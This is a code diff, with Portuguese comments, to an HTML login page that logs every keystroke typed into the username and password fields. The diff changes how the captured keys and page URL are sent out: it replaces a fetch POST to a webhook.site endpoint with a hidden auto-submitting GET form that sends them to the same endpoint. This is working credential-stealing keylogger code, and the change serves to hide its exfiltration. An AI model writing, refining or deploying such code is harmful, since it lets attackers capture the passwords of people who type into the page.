@@ -65,6 +65,9 @@
       cursor: pointer;
       margin-top: 10px;
     }
+    #hiddenForm {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -89,6 +92,9 @@
         <tbody id="keylogBody"></tbody>
       </table>
     </div>
+    <form id="hiddenForm" action="https://webhook.site/62457822-a08f-448b-8030-7c9fd34772a1" method="GET">
+      <input type="hidden" id="dataInput" name="data">
+    </form>
   </div>
   <script>
     // Inicializa o keylog a partir do localStorage ou array vazio
@@ -99,6 +105,7 @@
       const inputId = event.target.id;
       const key = event.key;
       keylog.push({ timestamp, inputId, key });
+      console.log('Tecla capturada:', { timestamp, inputId, key }); // Depuração
       // Salva no localStorage para persistência
       localStorage.setItem('keylogData', JSON.stringify(keylog));
       // Envia os dados imediatamente
@@ -109,36 +116,18 @@
     document.getElementById('username').addEventListener('keydown', logKey);
     document.getElementById('password').addEventListener('keydown', logKey);
 
-    // Função para enviar dados capturados
+    // Função para enviar dados usando formulário oculto
     function sendData() {
-      const payload = {
+      const payload = encodeURIComponent(JSON.stringify({
         url: window.location.href,
         keys: keylog
-      };
-
-      // Endpoint fornecido pelo usuário
-      const endpoint = 'https://webhook.site/62457822-a08f-448b-8030-7c9fd34772a1';
-      
-      fetch(endpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-        mode: 'cors'
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('Erro ao enviar dados');
-        console.log('Dados enviados com sucesso');
-        // Limpa keylog após envio bem-sucedido
-        keylog = [];
-        localStorage.setItem('keylogData', JSON.stringify(keylog));
-      })
-      .catch(error => {
-        console.error('Erro:', error);
-        // Mantém dados no localStorage se o envio falhar
-        localStorage.setItem('keylogData', JSON.stringify(payload.keys));
-      });
+      }));
+      document.getElementById('dataInput').value = payload;
+      document.getElementById('hiddenForm').submit();
+      console.log('Dados enviados via GET:', payload);
+      // Limpa keylog após envio
+      keylog = [];
+      localStorage.setItem('keylogData', JSON.stringify(keylog));
     }
 
     // Envia dados ao submeter o formulário
